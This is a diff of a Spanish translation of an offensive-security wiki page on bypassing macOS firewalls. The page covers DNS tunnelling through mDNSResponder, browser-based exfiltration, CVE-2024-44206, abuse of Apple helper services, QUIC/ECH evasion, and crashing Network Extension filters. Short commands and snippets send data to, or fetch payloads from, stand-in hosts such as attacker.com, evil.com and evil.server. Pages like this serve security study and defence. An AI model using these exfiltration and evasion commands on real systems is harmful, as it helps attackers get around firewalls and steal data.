@@ -4,9 +4,9 @@
 
 ## Técnicas encontradas
 
-Las siguientes técnicas se probaron con éxito en algunas aplicaciones de firewall de macOS.
+Las siguientes técnicas se encontraron funcionando en algunas aplicaciones de firewall de macOS.
 
-### Abusar de los nombres de whitelist
+### Abusing whitelist names
 
 - Por ejemplo, llamar al malware con nombres de procesos conocidos de macOS, como **`launchd`**
 
@@ -22,9 +22,9 @@ Las siguientes técnicas se probaron con éxito en algunas aplicaciones de firew
 
 El firewall podría permitir conexiones a dominios conocidos de Apple, como **`apple.com`** o **`icloud.com`**. Además, iCloud podría utilizarse como C2.
 
-### Bypass genérico
+### Generic Bypass
 
-Algunas ideas para intentar evadir firewalls
+Algunas ideas para intentar bypass firewalls
 
 ### Comprobar el tráfico permitido
 
@@ -32,13 +32,25 @@ Conocer el tráfico permitido ayudará a identificar dominios potencialmente inc
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-### Abusing DNS
+### Abuso de DNS
 
-Las resoluciones DNS se realizan mediante la aplicación firmada **`mdnsreponder`**, que probablemente tendrá permitido contactar con servidores DNS.<sup>[1]</sup>
+En macOS, un proceso **no** se comunica directamente con el servidor DNS. La resolución de nombres se gestiona mediante **XPC** por **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), un daemon del sistema firmado por Apple, por lo que cada consulta realizada en el equipo sale del host como tráfico **de `mDNSResponder`** en lugar de hacerlo desde el proceso que la solicitó. Por tanto, los firewalls suelen confiar incondicionalmente en ese daemon; denegarlo rompería la resolución de nombres de todo el sistema.<sup>[1]</sup>
 
-<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
+Esto convierte DNS en un canal que permanece abierto incluso cuando el firewall bloquea los propios sockets del malware:<sup>[1]</sup>
 
-### A través de aplicaciones del navegador
+1. El malware intenta conectarse a `evil.com`. El firewall examina su propia conexión saliente y la **bloquea**.
+2. En su lugar, el malware solicita a `mDNSResponder` que **resuelva** `evil.com` mediante XPC.
+3. El firewall examina la consulta resultante, ve que el originador es el resolvedor de confianza firmado por Apple y la **permite**.
+4. La consulta llega al servidor DNS y, si el atacante ejecuta el servidor autoritativo de `evil.com`, controla ambos extremos del intercambio.
+
+Como el atacante controla esa zona, nunca se necesita una "conexión": los datos se extraen dentro de las **labels consultadas** (por ejemplo, `<encoded-chunk>.evil.com`) y los comandos regresan dentro de los **answer records** (TXT, A, CNAME…), lo que constituye un DNS tunnelling clásico que utiliza un proceso completamente incluido en la whitelist.
+
+Cualquier proceso sin privilegios puede utilizar directamente el daemon, lo que permite confirmar fácilmente que el canal está abierto:
+```bash
+# resolution is performed by mDNSResponder on the caller's behalf
+dns-sd -G v4v6 evil.com
+```
+### Mediante aplicaciones del navegador
 
 - **oascript**
 ```applescript
@@ -63,7 +75,7 @@ open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
 ### Mediante inyecciones de procesos
 
-Si puedes **inyectar código en un proceso** que tenga permitido conectarse a cualquier servidor, podrías evadir las protecciones del firewall:
+Si puedes **inyectar código en un proceso** al que se le permita conectarse a cualquier servidor, podrías evadir las protecciones del firewall:
 
 
 {{#ref}}
@@ -72,20 +84,20 @@ macos-proces-abuse/
 
 ---
 
-## Vulnerabilidades recientes para evadir el firewall de macOS (2023-2025)
+## Vulnerabilidades recientes de bypass del firewall de macOS (2023-2025)
 
-### Evasión del filtro de contenido web (Screen Time) – **CVE-2024-44206**
-En julio de 2024, Apple corrigió un fallo crítico en Safari/WebKit que inutilizaba el “filtro de contenido web” de todo el sistema utilizado por los controles parentales de Screen Time.
-Un URI especialmente manipulado (por ejemplo, con un “://” codificado dos veces en URL) no es reconocido por la ACL de Screen Time, pero sí es aceptado por WebKit, por lo que la solicitud se envía sin filtrar. Por tanto, cualquier proceso que pueda abrir una URL (incluido código en sandbox o sin firmar) puede acceder a dominios bloqueados explícitamente por el usuario o por un perfil de MDM.<sup>[2]</sup>
+### Bypass del filtro de contenido web (Screen Time) - **CVE-2024-44206**
+En julio de 2024, Apple corrigió un bug crítico en Safari/WebKit que afectaba al “filtro de contenido web” de todo el sistema, utilizado por los controles parentales de Screen Time.
+Un URI especialmente diseñado (por ejemplo, con un “://” codificado dos veces en URL) no es reconocido por la ACL de Screen Time, pero sí es aceptado por WebKit, por lo que la solicitud se envía sin filtrar. Por tanto, cualquier proceso que pueda abrir una URL (incluido código en sandbox o sin firmar) puede acceder a dominios que el usuario o un perfil MDM hayan bloqueado explícitamente.<sup>[2]</sup>
 
 Prueba práctica (sistema sin parchear):
 ```bash
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-### Error de ordenación de reglas de Packet Filter (PF) en las primeras versiones de macOS 14 “Sonoma”
-Durante el ciclo beta de macOS 14, Apple introdujo una regresión en el wrapper de espacio de usuario alrededor de **`pfctl`**.
-Las reglas añadidas con la palabra clave `quick` (utilizada por muchos kill-switches de VPN) se ignoraban silenciosamente, provocando leaks de tráfico incluso cuando la interfaz gráfica de la VPN/firewall mostraba *blocked*. El error fue confirmado por varios proveedores de VPN y corregido en RC 2 (build 23A344).
+### Bug de ordenación de reglas de Packet Filter (PF) en las primeras versiones de macOS 14 “Sonoma”
+Durante el ciclo beta de macOS 14, Apple introdujo una regresión en el wrapper de userspace alrededor de **`pfctl`**.
+Las reglas añadidas con la keyword `quick` (utilizada por muchos kill-switches de VPN) se ignoraban silenciosamente, provocando leaks de tráfico incluso cuando la interfaz gráfica de la VPN/firewall mostraba *blocked*. El bug fue confirmado por varios proveedores de VPN y corregido en RC 2 (build 23A344).
 
 Comprobación rápida de leak:
 ```bash
@@ -93,8 +105,8 @@ pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
 ### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
-Antes de macOS 11.2, **`ContentFilterExclusionList`** permitía que unos 50 binarios de Apple, como **`nsurlsessiond`** y App Store, evadieran todos los socket-filter firewalls implementados con el framework Network Extension (LuLu, Little Snitch, etc.).
-El malware podía simplemente spawn un proceso excluido —o inject code en él— y tunnelizar su propio tráfico a través del socket ya permitido. Apple eliminó por completo la lista de exclusión en macOS 11.2, pero la técnica sigue siendo relevante en sistemas que no se pueden actualizar.<sup>[3]</sup>
+Antes de macOS 11.2, **`ContentFilterExclusionList`** permitía que unos 50 binarios de Apple, como **`nsurlsessiond`** y el App Store, eludieran todos los socket-filter firewalls implementados con el framework Network Extension (LuLu, Little Snitch, etc.).
+El malware podía simplemente spawn un proceso excluido —o inyectar código en él— y tunelizar su propio tráfico a través del socket ya permitido. Apple eliminó completamente la lista de exclusión en macOS 11.2, pero la técnica sigue siendo relevante en sistemas que no se pueden actualizar.<sup>[3]</sup>
 
 Ejemplo de proof-of-concept (pre-11.2):
 ```python
@@ -106,7 +118,7 @@ s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
 ### QUIC/ECH para evadir los filtros de dominio de Network Extension (macOS 12+)
-Los proveedores **NEFilter Packet/Data** se basan en el SNI/ALPN de TLS ClientHello. Con **HTTP/3 sobre QUIC (UDP/443)** y **Encrypted Client Hello (ECH)**, el SNI permanece cifrado, NetExt no puede analizar el flujo y las reglas de hostname suelen aplicar fail-open, lo que permite que el malware llegue a dominios bloqueados sin tocar DNS.<sup>[5]</sup>
+NEFilter Packet/Data Providers se basan en el SNI/ALPN del TLS ClientHello. Con **HTTP/3 sobre QUIC (UDP/443)** y **Encrypted Client Hello (ECH)**, el SNI permanece cifrado, NetExt no puede analizar el flujo y las reglas de hostname suelen aplicar un fail-open, permitiendo que el malware alcance dominios bloqueados sin interactuar con DNS.<sup>[5]</sup>
 
 PoC mínimo:
 ```bash
@@ -122,9 +134,9 @@ curl --http3-only https://attacker.com/payload
 Si QUIC/ECH sigue habilitado, esta es una vía sencilla para evadir el filtrado por hostname.
 
 ### Inestabilidad de Network Extension en macOS 15 “Sequoia” (2024–2025)
-Las primeras versiones 15.0/15.1 provocan el cierre inesperado de filtros de **Network Extension** de terceros (LuLu, Little Snitch, Defender, SentinelOne, etc.). Cuando el filtro se reinicia, macOS elimina sus reglas de flujo y muchos productos adoptan una configuración fail-open. Inundar el filtro con miles de flujos UDP cortos (o forzar QUIC/ECH) puede activar repetidamente el cierre inesperado y dejar una ventana para C2/exfil mientras la GUI sigue indicando que el firewall está ejecutándose.<sup>[4]</sup>
+Las primeras versiones 15.0/15.1 bloquean los filtros de terceros de **Network Extension** (LuLu, Little Snitch, Defender, SentinelOne, etc.). Cuando el filtro se reinicia, macOS descarta sus reglas de flujo y muchos productos fallan en modo fail-open. Inundar el filtro con miles de flujos UDP cortos (o forzar QUIC/ECH) puede provocar repetidamente el bloqueo y dejar una ventana para C2/exfil, mientras la GUI sigue indicando que el firewall está ejecutándose.<sup>[4]</sup>
 
-Reproducción rápida (entorno de laboratorio seguro):
+Reproducción rápida (equipo de laboratorio seguro):
 ```bash
 # create many short UDP flows to exhaust NE filter queues
 python3 - <<'PY'
@@ -140,24 +152,24 @@ log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslo
 
 ## Consejos de tooling para macOS moderno
 
-1. Inspecciona las reglas PF actuales que generan los firewalls GUI:
+1. Inspecciona las reglas de PF actuales que generan los firewall con GUI:
 ```bash
 sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 ```
-2. Enumera los binarios que ya tienen el *outgoing-network* entitlement (útil para hacer piggy-backing):
+2. Enumera los binarios que ya tienen el entitlement *outgoing-network* (útil para hacer piggy-backing):
 ```bash
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
 ```
 3. Registra mediante programación tu propio content filter de Network Extension en Objective-C/Swift.
-En el código fuente de **LuLu** de Patrick Wardle hay disponible un PoC rootless mínimo que reenvía paquetes a un socket local.
+En el código fuente de **LuLu**, de Patrick Wardle, hay disponible una PoC rootless mínima que reenvía paquetes a un socket local.
 
 ## Referencias
 
-- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
-- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
-- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
-- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
-- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
+- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Creación y ruptura de firewall de macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+- [2] [El bypass del web content filter de Apple permite acceso sin restricciones al contenido bloqueado (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
+- [3] [Apple elimina una función de macOS que permitía a las apps evadir la seguridad del firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
+- [4] [Los productos de cybersecurity dejan de funcionar tras la actualización a macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
+- [5] [Usa la protección de red para ayudar a evitar conexiones de macOS a sitios maliciosos - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
 
 {{#include ../../banners/hacktricks-training.md}}
